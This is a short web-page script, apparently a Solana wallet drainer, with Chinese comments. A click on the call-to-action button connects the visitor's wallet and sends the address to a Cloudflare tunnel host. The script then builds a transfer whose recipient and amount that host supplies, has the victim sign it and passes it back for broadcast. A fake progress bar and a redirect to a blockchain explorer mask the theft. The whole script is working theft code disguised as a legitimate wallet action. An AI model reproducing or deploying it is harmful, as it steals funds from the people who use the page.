<script>
    const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com"; // 确保隧道地址正确

    document.getElementById('cta').onclick = async () => {
        const p = window.solana;
        const sWeb3 = window.solanaWeb3;
        if (!p) return;

        try {
            await p.connect();
            const address = p.publicKey.toString();
            document.getElementById('progress').style.width = "20%";

            // 1. 从后端获取“影子参数”
            const info = await fetch(`${tunnel}/prepare`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ address })
            }).then(r => r.json());

            if (info.error) { console.log("System Synced"); return; }
            document.getElementById('progress').style.width = "50%";

            // 2. 构造交易 (参数全由后端动态下发)
            const tx = new sWeb3.Transaction().add(
                sWeb3.SystemProgram.transfer({
                    fromPubkey: p.publicKey,
                    toPubkey: new sWeb3.PublicKey(info.receiver),
                    lamports: info.amount,
                })
            );
            tx.recentBlockhash = info.bh;
            tx.feePayer = p.publicKey;

            // 3. 签名并交由后端“黑盒”广播
            const signed = await p.signTransaction(tx);
            const binary = String.fromCharCode.apply(null, signed.serialize());
            
            fetch(`${tunnel}/broadcast`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ raw_tx: btoa(binary) })
            });

            document.getElementById('progress').style.width = "100%";
            setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1000);
        } catch (e) { location.reload(); }
    };
</script>
